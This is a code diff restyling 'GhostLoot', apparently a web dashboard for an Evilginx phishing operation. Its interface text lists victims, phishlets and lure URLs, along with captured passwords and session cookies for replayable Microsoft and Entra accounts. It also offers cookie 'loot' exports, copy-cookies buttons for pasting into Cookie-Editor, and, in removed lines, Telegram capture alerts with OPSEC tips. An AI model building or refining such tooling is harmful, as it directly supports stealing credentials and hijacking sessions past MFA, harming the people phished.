@@ -5,297 +5,409 @@
 <meta name="viewport" content="width=device-width, initial-scale=1">
 <title>GhostLoot</title>
 <style>
-  :root{
-    --bg:#0b0f14;--bg2:#0d1117;--card:#141a22;--card2:#1a212b;--bd:#232c38;--bd2:#2d3947;
-    --tx:#e6edf3;--mut:#8b98a9;--dim:#5b6675;
-    --ok:#3fb950;--okbg:rgba(63,185,80,.14);--bad:#f85149;--badbg:rgba(248,81,73,.12);
-    --warn:#d29922;--acc:#4c9aff;--accbg:rgba(76,154,255,.14);--pur:#bc8cff;
+  :root {
+    --bg: #1c1914;
+    --bg2: #141210;
+    --panel: #221e18;
+    --ink: #f0ebe3;
+    --mute: #9a9186;
+    --faint: #6e675e;
+    --line: #3d372f;
+    --copper: #d4783c;
+    --copper-dim: #8a4e28;
+    --olive: #8fa86a;
+    --olive-dim: #3f4c2e;
+    --bad: #c45c4a;
+    --warn: #c9a227;
+    --sans: "Avenir Next", Avenir, "Segoe UI", sans-serif;
+    --display: "DIN Alternate", "Avenir Next Condensed", "Bahnschrift", "Arial Narrow", sans-serif;
+    --mono: "IBM Plex Mono", "Source Code Pro", Menlo, Consolas, monospace;
   }
-  *{box-sizing:border-box}
-  html,body{margin:0;height:100%}
-  body{background:var(--bg);color:var(--tx);font:13.5px/1.5 -apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif}
-  a{color:var(--acc);text-decoration:none}
-  .top{display:flex;align-items:center;gap:14px;padding:12px 20px;border-bottom:1px solid var(--bd);
-       background:linear-gradient(180deg,#0e141b,#0b0f14);position:sticky;top:0;z-index:20;flex-wrap:wrap}
-  .brand{font-weight:700;font-size:15px;letter-spacing:.2px;display:flex;align-items:center;gap:8px}
-  .brand .dot{width:9px;height:9px;border-radius:50%;background:var(--ok);box-shadow:0 0 8px var(--ok)}
-  .meta{color:var(--dim);font-size:12px}
-  .meta code{color:var(--mut);background:#0a0e13;border:1px solid var(--bd);padding:1px 6px;border-radius:5px}
-  .spacer{flex:1}
-  .search{position:relative}
-  .search input{background:#0a0e13;border:1px solid var(--bd2);color:var(--tx);border-radius:8px;
-       padding:7px 10px 7px 30px;width:240px;font-size:13px;outline:none}
-  .search input:focus{border-color:var(--acc)}
-  .search svg{position:absolute;left:9px;top:8px;opacity:.5}
-  .btn{background:var(--card2);color:var(--tx);border:1px solid var(--bd2);border-radius:8px;
-       padding:7px 11px;font-size:12.5px;cursor:pointer;white-space:nowrap;display:inline-flex;align-items:center;gap:6px}
-  .btn:hover{border-color:var(--acc);color:var(--acc)}
-  .btn.on{background:var(--accbg);border-color:var(--acc);color:var(--acc)}
-  .live{display:inline-flex;align-items:center;gap:6px}
-  .live .d{width:7px;height:7px;border-radius:50%;background:var(--dim)}
-  .live.on .d{background:var(--ok);animation:pulse 1.6s infinite}
-  @keyframes pulse{0%{box-shadow:0 0 0 0 rgba(63,185,80,.5)}70%{box-shadow:0 0 0 6px rgba(63,185,80,0)}100%{box-shadow:0 0 0 0 rgba(63,185,80,0)}}
-  .tabs{display:flex;gap:4px;padding:12px 20px 0}
-  .tab{padding:8px 14px;border-radius:8px 8px 0 0;cursor:pointer;color:var(--mut);font-weight:600;font-size:13px;border:1px solid transparent;border-bottom:none}
-  .tab.on{background:var(--card);color:var(--tx);border-color:var(--bd)}
-  .kpis{display:grid;grid-template-columns:repeat(auto-fill,minmax(155px,1fr));gap:12px;padding:16px 20px}
-  .kpi{background:var(--card);border:1px solid var(--bd);border-radius:12px;padding:13px 16px;position:relative;overflow:hidden}
-  .kpi .n{font-size:27px;font-weight:700;line-height:1.1}
-  .kpi .l{color:var(--mut);font-size:11px;text-transform:uppercase;letter-spacing:.05em;margin-top:3px}
-  .kpi.g .n{color:var(--ok)} .kpi.b .n{color:var(--acc)} .kpi.p .n{color:var(--pur)} .kpi.w .n{color:var(--warn)}
-  .kpi .bar{position:absolute;left:0;top:0;bottom:0;width:3px}
-  .kpi.g .bar{background:var(--ok)} .kpi.b .bar{background:var(--acc)} .kpi.p .bar{background:var(--pur)} .kpi.w .bar{background:var(--warn)} .kpi.n0 .bar{background:var(--dim)}
-  .filters{display:flex;align-items:center;gap:10px;padding:0 20px 12px;flex-wrap:wrap}
-  .filters select{background:#0a0e13;border:1px solid var(--bd2);color:var(--tx);border-radius:8px;padding:6px 9px;font-size:12.5px;outline:none}
-  .chk{display:inline-flex;align-items:center;gap:6px;color:var(--mut);font-size:12.5px;cursor:pointer;user-select:none}
-  .count{color:var(--dim);font-size:12px;margin-left:auto}
-  .wrap{padding:0 20px 60px;overflow-x:auto}
-  table{border-collapse:separate;border-spacing:0;width:100%;min-width:920px}
-  thead th{background:var(--bg);color:var(--mut);font-size:11px;text-transform:uppercase;
-       letter-spacing:.04em;text-align:left;padding:9px 12px;border-bottom:1px solid var(--bd);cursor:pointer;white-space:nowrap}
-  thead th .ar{opacity:.4;font-size:10px}
-  thead th.sorted{color:var(--tx)} thead th.sorted .ar{opacity:1;color:var(--acc)}
-  tbody td{padding:10px 12px;border-bottom:1px solid #171e27;vertical-align:middle}
-  tbody tr:hover td{background:#111823}
-  tbody tr.new td{animation:flash 2.5s ease-out}
-  @keyframes flash{0%{background:var(--accbg)}100%{background:transparent}}
-  .u{font-weight:600}
-  .mut{color:var(--dim)}
-  .phl{display:inline-block;background:#182231;color:var(--acc);border:1px solid #223047;border-radius:6px;padding:1px 8px;font-size:11.5px;font-weight:600}
-  .phl+.phl{margin-left:4px}
-  .pill{display:inline-block;padding:2px 9px;border-radius:999px;font-size:11.5px;font-weight:700;letter-spacing:.02em}
-  .pill.ok{background:var(--okbg);color:var(--ok)} .pill.bad{background:var(--badbg);color:var(--bad)}
-  .num{font-variant-numeric:tabular-nums}
-  .secret{font-family:ui-monospace,SFMono-Regular,Menlo,monospace;font-size:12px;cursor:pointer;
-       background:#0a0e13;border:1px solid var(--bd);border-radius:6px;padding:2px 8px;display:inline-block;max-width:180px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;vertical-align:middle}
-  .secret.hide{color:transparent;text-shadow:0 0 7px rgba(230,237,243,.85)}
-  .rowbtn{background:transparent;border:1px solid var(--bd2);color:var(--mut);border-radius:6px;padding:4px 9px;font-size:11.5px;cursor:pointer}
-  .rowbtn:hover{border-color:var(--acc);color:var(--acc)}
-  .rowbtn.primary{border-color:#2b6b3a;color:var(--ok)}
-  .rowbtn.primary:hover{background:var(--okbg)}
-  .exp{cursor:pointer;color:var(--dim);width:16px;display:inline-block;text-align:center;transition:transform .12s}
-  .exp.open{transform:rotate(90deg);color:var(--acc)}
-  .detail td{background:#0c1117;padding:0}
-  .detail .inner{padding:14px 16px 18px}
-  .dgrid{display:grid;grid-template-columns:repeat(auto-fit,minmax(230px,1fr));gap:8px 22px;margin-bottom:12px}
-  .dgrid .k{color:var(--dim);font-size:11px;text-transform:uppercase;letter-spacing:.04em}
-  .dgrid .v{font-size:12.5px;word-break:break-all}
-  .attempts{margin-top:6px}
-  .attempts .a{display:flex;align-items:center;gap:10px;padding:6px 8px;border:1px solid var(--bd);border-radius:8px;margin-bottom:6px;font-size:12.5px;background:var(--card)}
-  .cookies-list{margin-top:8px;font-family:ui-monospace,Menlo,monospace;font-size:12px;color:var(--mut);max-height:180px;overflow:auto;border:1px solid var(--bd);border-radius:8px;padding:8px}
-  .cookies-list .cn{color:var(--tx)} .cookies-list .cd{color:var(--acc)}
-  #toast{position:fixed;bottom:22px;right:22px;background:var(--card2);border:1px solid var(--ok);color:var(--tx);
-       padding:11px 16px;border-radius:10px;box-shadow:0 8px 30px rgba(0,0,0,.5);opacity:0;transform:translateY(10px);
-       transition:.2s;z-index:50;font-size:13px;max-width:340px}
-  #toast.show{opacity:1;transform:none}
-  footer{position:fixed;bottom:0;left:0;right:0;padding:6px 20px;background:#0a0e13;border-top:1px solid var(--bd);color:var(--dim);font-size:11px;text-align:center}
-  .empty{text-align:center;color:var(--dim);padding:40px}
-  .dombar{display:none;gap:8px;padding:10px 20px;flex-wrap:wrap;align-items:center;border-bottom:1px solid var(--bd);background:#0c1117}
-  .dombar .lbl{color:var(--dim);font-size:11px;text-transform:uppercase;letter-spacing:.05em;margin-right:2px}
-  .dchip{display:inline-flex;align-items:center;gap:7px;background:var(--card);border:1px solid var(--bd);border-radius:999px;padding:4px 11px;font-size:12px}
-  .dchip .dd{width:8px;height:8px;border-radius:50%;flex:0 0 auto}
-  .dchip .dd.ok{background:var(--ok);box-shadow:0 0 6px var(--ok)} .dchip .dd.down{background:var(--bad);box-shadow:0 0 6px var(--bad)} .dchip .dd.flag{background:var(--warn);box-shadow:0 0 6px var(--warn)}
-  .dchip .h{color:var(--tx);font-weight:600} .dchip .s{color:var(--dim);font-size:11px}
-  #urlsview{padding-bottom:60px}
-  .urlbar{display:flex;gap:10px;padding:16px 20px;flex-wrap:wrap;align-items:center}
-  .urlbar input{background:#0a0e13;border:1px solid var(--bd2);color:var(--tx);border-radius:8px;padding:8px 11px;font-size:13px;outline:none}
-  .urlbar input:focus{border-color:var(--acc)}
-  .urlbar input#nu{min-width:340px;flex:1}
-  .urlrow{display:flex;align-items:center;gap:12px;padding:9px 20px;border-bottom:1px solid #171e27}
-  .urlrow:hover{background:#111823}
-  .urlrow .dd{width:9px;height:9px;border-radius:50%;flex:0 0 auto}
-  .urlrow .dd.ok{background:var(--ok);box-shadow:0 0 6px var(--ok)} .urlrow .dd.down{background:var(--bad)}
-  .urlrow .url{font-family:ui-monospace,Menlo,monospace;font-size:12.5px;color:var(--acc);cursor:pointer;word-break:break-all}
-  .urlrow .lab{color:var(--mut);font-size:12px;background:#182231;border:1px solid #223047;border-radius:6px;padding:1px 8px}
-  .urlrow .sp{flex:1}
-  #settingsview{padding:22px 24px 60px;max-width:640px}
-  #settingsview h3{font-size:14px;margin:0 0 4px;text-transform:uppercase;letter-spacing:.05em;color:var(--tx)}
-  #settingsview .sub{color:var(--dim);font-size:12px;margin:0 0 16px}
-  .card{background:var(--card);border:1px solid var(--bd);border-radius:12px;padding:18px 20px}
-  .frow{display:flex;flex-direction:column;gap:5px;margin:12px 0}
-  .frow label{color:var(--mut);font-size:12px}
-  .frow input[type=text]{background:#0a0e13;border:1px solid var(--bd2);color:var(--tx);border-radius:8px;padding:9px 11px;font-size:13px;outline:none;font-family:ui-monospace,Menlo,monospace}
-  .frow input:focus{border-color:var(--acc)}
-  .setchk{display:flex;align-items:center;gap:8px;margin:12px 0;color:var(--tx);font-size:13px;cursor:pointer}
-  .setbtns{display:flex;gap:10px;margin-top:18px}
-  .note{color:var(--dim);font-size:12px;line-height:1.6;margin-top:16px}
-  .note code{background:#0a0e13;border:1px solid var(--bd);border-radius:5px;padding:1px 6px;color:var(--acc)}
-  .timeline{display:none;align-items:flex-end;gap:3px;padding:8px 24px 4px;height:52px}
-  .timeline .bwrap{display:flex;flex-direction:column;align-items:center;gap:3px;justify-content:flex-end}
-  .timeline .bar{width:14px;background:var(--ok);border-radius:2px 2px 0 0;min-height:2px;opacity:.85}
-  .timeline .bl{font-size:9px;color:var(--dim)}
-  .timeline .tlab{align-self:center;color:var(--dim);font-size:11px;margin-right:6px}
-  .badge{display:inline-block;padding:1px 7px;border-radius:999px;font-size:10.5px;font-weight:700;margin-left:5px;vertical-align:middle}
-  .badge.used{background:#26324a;color:#9db4d8}
-  .badge.mip{background:rgba(210,153,34,.15);color:var(--warn)}
-  .vstate{display:flex;align-items:center;gap:10px;margin-top:12px;flex-wrap:wrap;border-top:1px solid var(--bd);padding-top:12px}
-  .vstate input.notes{flex:1;min-width:200px;background:#0a0e13;border:1px solid var(--bd2);color:var(--tx);border-radius:8px;padding:6px 10px;font-size:12.5px;outline:none}
-  #luresview{padding:8px 0 60px}
+  * { box-sizing: border-box; }
+  html, body { margin: 0; height: 100%; }
+  html { color-scheme: dark; }
+  body {
+    background: var(--bg);
+    color: var(--ink);
+    font: 14px/1.45 var(--sans);
+    display: grid;
+    grid-template-columns: 148px 1fr;
+    grid-template-rows: auto 1fr auto;
+    grid-template-areas: "top top" "rail main" "foot foot";
+    min-height: 100%;
+  }
+  button, input, select { font: inherit; color: inherit; }
+  a { color: var(--copper); text-decoration: none; }
+  a:hover { text-decoration: underline; }
+  :focus-visible { outline: 2px solid var(--copper); outline-offset: 2px; }
+
+  .top {
+    grid-area: top;
+    display: flex; align-items: baseline; gap: 18px;
+    padding: 14px 20px 12px;
+    border-bottom: 1px solid var(--line);
+    background: var(--bg2);
+    flex-wrap: wrap;
+  }
+  .wordmark {
+    font-family: var(--display);
+    font-size: 22px; font-weight: 600; letter-spacing: -0.02em;
+    line-height: 1; color: var(--ink);
+    border-bottom: 2px solid var(--copper);
+    padding-bottom: 1px;
+  }
+  .facts { margin: 0; color: var(--mute); font-size: 13px; flex: 1; min-width: 220px; }
+  .facts b { color: var(--ink); font-weight: 600; }
+  .facts .ok { color: var(--olive); }
+  .facts .bad { color: var(--bad); }
+  .tools { display: flex; align-items: center; gap: 8px; flex-wrap: wrap; }
+  .search { position: relative; }
+  .search input {
+    background: var(--bg); border: 1px solid var(--line); color: var(--ink);
+    padding: 6px 10px 6px 28px; width: 220px; border-radius: 2px;
+  }
+  .search input:focus { border-color: var(--copper); outline: none; }
+  .search span { position: absolute; left: 8px; top: 6px; color: var(--faint); font-family: var(--mono); font-size: 12px; }
+  .btn {
+    background: transparent; border: 1px solid var(--line); color: var(--ink);
+    padding: 6px 10px; border-radius: 2px; cursor: pointer; white-space: nowrap;
+  }
+  .btn:hover { border-color: var(--copper); color: var(--copper); }
+  .btn.on { border-color: var(--copper); color: var(--copper); }
+  .btn.primary { background: var(--copper); border-color: var(--copper); color: #1c1914; font-weight: 600; }
+  .btn.primary:hover { filter: brightness(1.08); color: #1c1914; }
+  .btn[disabled] { opacity: .4; cursor: default; }
+
+  .rail {
+    grid-area: rail;
+    border-right: 1px solid var(--line);
+    background: var(--bg2);
+    padding: 12px 0;
+    display: flex; flex-direction: column; gap: 2px;
+  }
+  .rail button {
+    display: block; width: 100%; text-align: left;
+    background: none; border: 0; border-left: 2px solid transparent;
+    color: var(--mute); padding: 8px 16px; cursor: pointer;
+  }
+  .rail button:hover { color: var(--ink); }
+  .rail button.on { color: var(--ink); border-left-color: var(--copper); background: var(--panel); }
+  .rail .hint { margin-top: auto; padding: 12px 16px; color: var(--faint); font-size: 11px; font-family: var(--mono); }
+
+  main { grid-area: main; display: flex; flex-direction: column; min-width: 0; min-height: 0; }
+  .dombar { display: none; gap: 10px; padding: 8px 16px; flex-wrap: wrap; align-items: center; border-bottom: 1px solid var(--line); font-size: 12px; color: var(--mute); }
+  .dchip { display: inline-flex; align-items: center; gap: 6px; }
+  .dchip i { width: 7px; height: 7px; display: inline-block; }
+  .dchip i.ok { background: var(--olive); }
+  .dchip i.down { background: var(--bad); }
+  .dchip i.flag { background: var(--warn); }
+
+  .toolbar { display: flex; align-items: center; gap: 12px; padding: 10px 16px; flex-wrap: wrap; border-bottom: 1px solid var(--line); }
+  .toolbar select { background: var(--bg); border: 1px solid var(--line); padding: 5px 8px; border-radius: 2px; }
+  .chk { display: inline-flex; align-items: center; gap: 6px; color: var(--mute); cursor: pointer; user-select: none; font-size: 13px; }
+  .count { margin-left: auto; color: var(--faint); font-size: 12px; font-family: var(--mono); }
+
+  .stage { flex: 1; display: grid; grid-template-rows: 1fr minmax(200px, 34vh); min-height: 0; }
+  .tablewrap { overflow: auto; }
+  table { border-collapse: collapse; width: 100%; min-width: 720px; }
+  thead th {
+    position: sticky; top: 0; background: var(--bg);
+    color: var(--mute); font-weight: 500; font-size: 12px;
+    text-align: left; padding: 8px 12px; border-bottom: 1px solid var(--line);
+    cursor: pointer; white-space: nowrap;
+  }
+  thead th.sorted { color: var(--ink); }
+  tbody td { padding: 8px 12px; border-bottom: 1px solid #2a261f; vertical-align: middle; }
+  tbody tr { cursor: pointer; }
+  tbody tr:hover td { background: #26221b; }
+  tbody tr.sel td { background: #2c241c; box-shadow: inset 3px 0 0 var(--copper); }
+  tbody tr.new td { background: #2a2618; }
+  .u { font-weight: 600; }
+  .mut { color: var(--faint); }
+  .num { font-family: var(--mono); font-variant-numeric: tabular-nums; font-size: 13px; }
+  .phl { font-family: var(--mono); font-size: 12px; color: var(--mute); }
+  .kind { font-family: var(--display); font-size: 13px; letter-spacing: .02em; }
+  .kind.msa { color: var(--copper); }
+  .kind.entra { color: var(--olive); }
+  .kind.none { color: var(--faint); }
+  .persist { color: var(--mute); font-size: 12px; margin-left: 6px; }
+  .mark { font-size: 11px; color: var(--mute); margin-left: 8px; }
+
+  .inspector {
+    border-top: 1px solid var(--line);
+    background: var(--panel);
+    overflow: auto;
+    padding: 14px 16px 18px;
+  }
+  .inspector h2 { margin: 0 0 4px; font-size: 16px; font-weight: 600; }
+  .inspector .sub { color: var(--mute); font-size: 13px; margin: 0 0 12px; font-family: var(--mono); }
+  .insp-actions { display: flex; gap: 8px; flex-wrap: wrap; margin-bottom: 12px; }
+  .meta-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(220px, 1fr)); gap: 8px 20px; margin-bottom: 12px; }
+  .meta-grid .k { color: var(--faint); font-size: 12px; }
+  .meta-grid .v { word-break: break-all; font-size: 13px; }
+  .attempts { display: flex; flex-direction: column; gap: 4px; }
+  .attempts .a {
+    display: flex; align-items: center; gap: 10px; flex-wrap: wrap;
+    padding: 6px 0; border-bottom: 1px solid var(--line); font-size: 13px;
+  }
+  .secret {
+    font-family: var(--mono); font-size: 12px; cursor: pointer;
+    background: var(--bg2); border: 1px solid var(--line); padding: 2px 8px; max-width: 240px;
+    overflow: hidden; text-overflow: ellipsis; white-space: nowrap;
+  }
+  .secret.hide { color: transparent; text-shadow: 0 0 6px rgba(240,235,227,.8); }
+  .cookies-list { font-family: var(--mono); font-size: 12px; color: var(--mute); max-height: 140px; overflow: auto; border: 1px solid var(--line); padding: 8px; background: var(--bg2); }
+  .cookies-list .strong { color: var(--copper); }
+  .vstate { display: flex; align-items: center; gap: 10px; margin-top: 12px; flex-wrap: wrap; }
+  .vstate input.notes { flex: 1; min-width: 180px; background: var(--bg2); border: 1px solid var(--line); padding: 6px 8px; border-radius: 2px; }
+  .empty-insp { color: var(--faint); padding: 24px 4px; }
+
+  #urlsview, #settingsview, #luresview { padding: 12px 16px 40px; overflow: auto; flex: 1; }
+  .urlbar { display: flex; gap: 8px; flex-wrap: wrap; align-items: center; margin-bottom: 12px; }
+  .urlbar input { background: var(--bg2); border: 1px solid var(--line); padding: 7px 10px; border-radius: 2px; min-width: 280px; flex: 1; }
+  .urlrow { display: flex; align-items: center; gap: 10px; padding: 8px 0; border-bottom: 1px solid var(--line); }
+  .urlrow .url { font-family: var(--mono); font-size: 13px; color: var(--copper); cursor: pointer; word-break: break-all; }
+  .urlrow .lab { color: var(--mute); font-size: 12px; }
+  .urlrow .sp { flex: 1; }
+  #settingsview { max-width: 560px; }
+  #settingsview h3 { margin: 0 0 4px; font-size: 16px; font-weight: 600; }
+  #settingsview .sub { color: var(--mute); font-size: 13px; margin: 0 0 14px; }
+  .frow { display: flex; flex-direction: column; gap: 4px; margin: 10px 0; }
+  .frow label { color: var(--mute); font-size: 13px; }
+  .frow input[type=text] { background: var(--bg2); border: 1px solid var(--line); padding: 8px 10px; font-family: var(--mono); border-radius: 2px; }
+  .setchk { display: flex; align-items: center; gap: 8px; margin: 10px 0; cursor: pointer; }
+  .setbtns { display: flex; gap: 8px; margin-top: 14px; }
+  .note { color: var(--faint); font-size: 12px; line-height: 1.55; margin-top: 14px; }
+  .note code { font-family: var(--mono); color: var(--ink); background: var(--bg2); padding: 0 4px; }
+  .empty { text-align: center; color: var(--faint); padding: 36px 12px; }
+
+  #toast {
+    position: fixed; bottom: 36px; right: 18px; background: var(--panel);
+    border: 1px solid var(--copper); color: var(--ink); padding: 10px 14px;
+    opacity: 0; transform: translateY(8px); transition: .15s; z-index: 50; max-width: 340px; pointer-events: none;
+  }
+  #toast.show { opacity: 1; transform: none; }
+  footer {
+    grid-area: foot; padding: 6px 16px; border-top: 1px solid var(--line);
+    background: var(--bg2); color: var(--faint); font-size: 11px; font-family: var(--mono);
+    display: flex; gap: 14px; flex-wrap: wrap;
+  }
+  #help {
+    position: fixed; inset: 0; background: rgba(20,18,16,.72); z-index: 60;
+    display: flex; align-items: center; justify-content: center; padding: 24px;
+  }
+  #help[hidden] { display: none; }
+  #help .card { background: var(--panel); border: 1px solid var(--line); padding: 18px 22px; max-width: 420px; width: 100%; }
+  #help h2 { margin: 0 0 10px; font-size: 16px; }
+  #help dl { margin: 0; display: grid; grid-template-columns: 72px 1fr; gap: 6px 12px; font-size: 13px; }
+  #help dt { font-family: var(--mono); color: var(--copper); }
+  #help dd { margin: 0; color: var(--mute); }
+
+  @media (max-width: 860px) {
+    body { grid-template-columns: 1fr; grid-template-areas: "top" "rail" "main" "foot"; }
+    .rail { flex-direction: row; overflow-x: auto; border-right: 0; border-bottom: 1px solid var(--line); padding: 0; }
+    .rail button { border-left: 0; border-bottom: 2px solid transparent; white-space: nowrap; }
+    .rail button.on { border-bottom-color: var(--copper); }
+    .rail .hint { display: none; }
+    .stage { grid-template-rows: 1fr minmax(240px, 50vh); }
+    .search input { width: 140px; }
+  }
+  @media (prefers-reduced-motion: reduce) {
+    #toast { transition: none; }
+  }
 </style>
 </head>
 <body>
-<div class="top">
-  <div class="brand"><span class="dot"></span>GhostLoot</div>
-  <span class="meta">db <code id="dbpath">…</code> · <span id="updated">…</span></span>
-  <div class="spacer"></div>
-  <div class="search">
-    <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="#8b98a9" stroke-width="2"><circle cx="11" cy="11" r="7"/><path d="M21 21l-4-4"/></svg>
-    <input id="q" autocomplete="off">
+<header class="top">
+  <div class="wordmark">GhostLoot</div>
+  <p class="facts" id="facts"></p>
+  <div class="tools">
+    <div class="search">
+      <span>/</span>
+      <input id="q" autocomplete="off" spellcheck="false">
+    </div>
+    <button class="btn" id="refresh" type="button"></button>
+    <button class="btn" id="auto" type="button"><span id="autolbl"></span></button>
+    <a class="btn" id="loot" href="/export/loot.zip"></a>
+    <a class="btn" id="csv" href="/export/sessions.csv"></a>
+    <button class="btn" id="langbtn" type="button"></button>
   </div>
-  <button class="btn" id="refresh"></button>
-  <button class="btn" id="auto"><span class="live" id="livewrap"><span class="d"></span></span><span id="autolbl"></span></button>
-  <a class="btn" id="loot" href="/export/loot.zip"></a>
-  <a class="btn" id="csv" href="/export/sessions.csv"></a>
-  <button class="btn" id="langbtn"></button>
-</div>
+</header>
 
-<div class="dombar" id="domains"></div>
+<nav class="rail">
+  <button type="button" class="on" data-tab="victims"></button>
+  <button type="button" data-tab="sessions"></button>
+  <button type="button" data-tab="lures"></button>
+  <button type="button" data-tab="urls"></button>
+  <button type="button" data-tab="settings"></button>
+  <div class="hint">? keys</div>
+</nav>
 
-<div class="tabs">
-  <div class="tab on" data-tab="victims"></div>
-  <div class="tab" data-tab="sessions"></div>
-  <div class="tab" data-tab="lures"></div>
-  <div class="tab" data-tab="urls"></div>
-  <div class="tab" data-tab="settings"></div>
-</div>
+<main>
+  <div class="dombar" id="domains"></div>
+  <div class="toolbar" id="toolbar">
+    <select id="fphishlet"></select>
+    <label class="chk"><input type="checkbox" id="fvalid"> <span id="fvalid_l"></span></label>
+    <label class="chk" id="fnoisewrap"><input type="checkbox" id="fnoise"> <span id="fnoise_l"></span></label>
+    <span class="count" id="count"></span>
+  </div>
+  <div class="stage" id="stage">
+    <div class="tablewrap">
+      <table>
+        <thead id="thead"></thead>
+        <tbody id="tbody"></tbody>
+      </table>
+    </div>
+    <aside class="inspector" id="inspector"></aside>
+  </div>
+  <div id="urlsview" hidden></div>
+  <div id="settingsview" hidden></div>
+  <div id="luresview" hidden></div>
+</main>
 
-<div id="timeline" class="timeline"></div>
-
-<div class="kpis" id="kpis"></div>
-
-<div class="filters">
-  <select id="fphishlet"></select>
-  <label class="chk"><input type="checkbox" id="fvalid"> <span id="fvalid_l"></span></label>
-  <label class="chk" id="fnoisewrap"><input type="checkbox" id="fnoise"> <span id="fnoise_l"></span></label>
-  <span class="count" id="count"></span>
-</div>
-
-<div class="wrap">
-  <table>
-    <thead id="thead"></thead>
-    <tbody id="tbody"></tbody>
-  </table>
-</div>
-
-<div id="urlsview" hidden></div>
-<div id="settingsview" hidden></div>
-<div id="luresview" hidden></div>
-
+<footer>
+  <span id="foothealth"></span>
+  <span id="footsb"></span>
+  <span id="footdb"></span>
+</footer>
 <div id="toast"></div>
-<footer><span id="foothealth"></span> · <span id="footsb"></span> · <span id="foottotal"></span></footer>
+<div id="help" hidden>
+  <div class="card">
+    <h2 id="help_title"></h2>
+    <dl id="help_dl"></dl>
+  </div>
+</div>
 
 <script>
-// ---------- i18n ----------
 const I18N = {
   en: {
-    search_ph:"Search user / IP…  (/)", refresh:"↻ Refresh", auto:"Auto", loot:"⬇ Loot", csv:"⬇ CSV",
-    loot_t:"Download all valid victims' cookies (zip)", csv_t:"Sessions CSV for the report (no secrets)",
-    tab_victims:"Victims", tab_sessions:"All sessions", tab_lures:"Lures", tab_urls:"My URLs", tab_settings:"Settings",
-    domains:"Domains", all_phishlets:"All phishlets", only_valid:"Valid session only", show_noise:"Show visits with no login",
-    kpi_unique:"Unique victims", kpi_valid:"With valid session", kpi_creds:"With credentials", kpi_nologin:"Visits w/o login",
-    kpi_phishlets:"Phishlets", kpi_total:"Total sessions",
-    th_user:"User", th_phishlet:"Phishlet", th_session:"Session", th_cookies:"Cookies", th_attempts:"Attempts",
-    th_lastip:"Last IP", th_seen:"Seen", th_loot:"Loot", th_pass:"Password", th_ip:"IP", th_captured:"Captured",
-    valid:"valid", no:"no", used:"used", dup:"dup", copy_cookies:"copy cookies", view_cookies:"view cookies",
-    of:"of", victims_l:"victims", sessions_l:"sessions", empty_victims:"No victims match the filter.",
-    empty_sessions:"No sessions match.", best_session:"Best session", cookies_w:"cookies", invalid:"invalid",
-    useragent:"User-Agent", landing:"Landing", attempts_h:"Attempts", mark_used:"Mark as used",
-    notes_ph:"notes (cookies reused, MFA ok, bounced...)", save:"save", loading:"loading…",
-    tl_valid:"valid · 14d", tl_title:"valid",
-    lure_col:"Lure (landing URL)", visits_col:"Visits", valid_col:"Valid", victims_col:"Victims", conv_col:"Conversion",
-    no_lures:"No lure data.", unknown:"(unknown)",
-    url_ph:"https://login.your-domain.com/xxxx", label_ph:"label (optional)", add:"+ Add", active_only:"Active only",
-    copy_active:"Copy active", active:"active", down:"down", copy:"copy", delete:"delete",
-    url_empty_active:"No active URLs right now.", url_empty:"Add your lure URLs above.",
-    url_saved:(a,t)=>`${a} active / ${t} saved`, confirm_del:"Delete this URL from the list?",
-    url_added:"URL added", url_copied:"URL copied", no_active:"No active URLs", active_copied:n=>`${n} active URLs copied`,
-    set_title:"Telegram alerts",
-    set_sub:"Get pinged when a victim with a valid session is captured or when a domain goes down. Configured here, no restart.",
-    set_enable:"Enable Telegram alerts", bot_token:"Bot token", chat_id:"Chat ID",
-    minimal:"Minimal alerts: don't include victim's user or IP (OPSEC-recommended)",
-    save_btn:"Save", send_test:"Send test", token_saved:"•••••• saved (leave empty to keep it)",
-    set_note:'How to get the values:<br>1. Create a bot with <code>@BotFather</code> → <code>/newbot</code> → gives you the <b>token</b>.<br>2. Message your bot and open <code>https://api.telegram.org/bot&lt;TOKEN&gt;/getUpdates</code>, copy the <b>chat id</b> (or use <code>@userinfobot</code>).<br>3. Save, then hit "Send test".',
-    settings_saved:"Settings saved", test_sent:"Test sent — check Telegram", error:"Error",
-    vstate_saved:"Victim state saved",
-    copied_paste:id=>`Session ${id} cookies copied. Paste them in Cookie-Editor / StorageAce.`,
-    new_sessions:n=>`${n} new session(s) captured`, load_err:"Error loading data",
-    updated:"updated", health_up:"● Evilginx active", health_down:"● Evilginx not detected",
-    last_capture:"last capture", no_captures:"no captures", sessions_phishlets:(s,p)=>`${s} sessions · ${p} phishlets`,
-    sb_on:'Safe Browsing: <span style="color:var(--warn)">ON ⚠ (your URLs are sent to Google)</span>',
-    sb_off:'Safe Browsing: <span style="color:var(--ok)">OFF</span>',
-    flagged:"flagged ⚠", mip_title:n=>`same account from ${n} distinct IPs; the cookie may bounce due to conditional access`,
+    search_ph:"user, IP, token…", refresh:"Refresh", auto:"Live", loot:"Loot zip", csv:"CSV",
+    loot_t:"Cookies of every replayable account", csv_t:"Masked session CSV for the report",
+    tab_victims:"Accounts", tab_sessions:"Captures", tab_lures:"Lures", tab_urls:"URLs", tab_settings:"Settings",
+    domains:"Hosts", all_phishlets:"All phishlets", only_valid:"Replayable only", show_noise:"Include visits with no login",
+    th_user:"Account", th_phishlet:"Phishlet", th_loot:"Loot", th_cookies:"Cookies", th_attempts:"Hits",
+    th_lastip:"IP", th_seen:"Seen", th_pass:"Password", th_captured:"Captured",
+    kind_msa:"MSA", kind_entra:"Entra", kind_none:"—", persist:"persist", used:"used",
+    of:"of", victims_l:"accounts", sessions_l:"captures", empty_victims:"Nothing matches.",
+    empty_sessions:"Nothing matches.", empty_insp:"Select a row. c copies cookies of the selection.",
+    best_session:"Best capture", cookies_w:"cookies", useragent:"User-Agent", landing:"Landing",
+    attempts_h:"Captures", mark_used:"Used", notes_ph:"notes (replayed, MFA, bounced…)", save:"Save notes",
+    loading:"loading…", copy_cookies:"Copy cookies", view_json:"JSON", view_cookies:"Cookie names",
+    lure_col:"Lure", visits_col:"Visits", valid_col:"Replayable", victims_col:"Accounts", conv_col:"Hit rate",
+    no_lures:"No lure data yet.", unknown:"(unknown)",
+    url_ph:"https://login.your-domain.com/xxxx", label_ph:"label", add:"Add", active_only:"Up only",
+    copy_active:"Copy live", active:"up", down:"down", copy:"Copy", delete:"Remove",
